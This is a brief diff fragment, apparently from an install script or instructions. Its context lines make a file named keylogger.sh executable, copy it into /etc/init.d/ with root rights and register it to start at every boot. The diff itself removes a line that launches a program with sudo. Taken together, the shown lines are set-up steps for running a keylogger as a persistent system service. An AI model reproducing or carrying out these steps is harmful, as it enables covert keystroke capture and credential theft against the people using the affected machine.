@@ -19,6 +19,3 @@ make
 chmod +x keylogger.sh
 sudo cp keylogger.sh /etc/init.d/
 sudo update-rc.d keylogger.sh defaults
-
-# Start the program.
-sudo ./main
